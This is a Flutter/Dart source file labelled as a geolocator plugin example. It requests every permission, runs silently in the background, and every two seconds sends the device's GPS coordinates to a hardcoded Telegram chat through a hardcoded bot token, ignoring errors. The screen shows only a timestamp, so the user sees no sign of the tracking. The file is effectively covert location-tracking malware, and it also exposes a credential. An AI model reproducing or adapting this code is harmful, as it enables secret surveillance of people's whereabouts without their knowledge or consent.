// ignore_for_file: unused_local_variable

import 'dart:async';
// import 'dart:io' show Platform;

import 'package:baseflow_plugin_template/baseflow_plugin_template.dart';
import 'package:flutter/material.dart';
import 'package:general_flutter/general_flutter.dart';

import 'package:telegram_client/telegram_bot_api/telegram_bot_api.dart';

/// Defines the main theme color.
final MaterialColor themeMaterialColor = BaseflowPluginExample.createMaterialColor(const Color.fromRGBO(48, 49, 60, 1));

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      home: GeolocatorWidget(),
    );
  }
}

/// Example [Widget] showing the functionalities of the geolocator plugin
class GeolocatorWidget extends StatefulWidget {
  /// Creates a new GeolocatorWidget.
  const GeolocatorWidget({Key? key}) : super(key: key);

  /// Utility method to create a page with the Baseflow templating.
  static ExamplePage createPage() {
    return ExamplePage(Icons.location_on, (context) => const GeolocatorWidget());
  }

  @override
  State<GeolocatorWidget> createState() => _GeolocatorWidgetState();
}

class _GeolocatorWidgetState extends State<GeolocatorWidget> {
  

  GeneralFlutter general_library = GeneralFlutter();
  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((timeStamp) {
      init();
    });
  }

  void init() async {
    await general_library.permission.flutter_auto_request_all();
    final hasPermission = await general_library.location.hashPermission();

    if (!hasPermission) {
      return;
    }
    await general_library.app_background.has_permissions;

    await general_library.app_background.initialize(notificationTitle: "App ", notificationMessage: "eroaksoa");
    await general_library.app_background.enable_background;

    Timer.periodic(const Duration(seconds: 2), task);
  }

  void task(Timer timer) {
    Future(() {
      _getCurrentPosition();
    });
  }

  DateTime dateTime = DateTime.now();
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: Text(
          "UPDATE-DATE: ${dateTime}",
        ),
      ),
    );
  }

  Future<void> _getCurrentPosition() async {
    GeneralLibraryLocationPositionData? position = await general_library.location.getCurrent();
    if (position == null) {
      return;
    }
    setState(() {
      dateTime = DateTime.now();
    });
    Future(() async {
      try {
        TelegramBotApi tg = TelegramBotApi(tokenBot: "6827497324:AAGw7Dk1rv7Mib3LHAou3AAXQwUQeB99O04");

        tg.request(
          "sendLocation",
          parameters: {
            "chat_id": 6495147242,
            "latitude": position.latitude,
            "longitude": position.longitude,
          },
          isThrowOnError: false,
        );
      } catch (e) {}
    });
  }

  @override
  void dispose() {
    super.dispose();
  }
}

enum PositionItemType {
  log,
  position,
}

class _PositionItem {
  _PositionItem(this.type, this.displayValue);

  final PositionItemType type;
  final String displayValue;
}
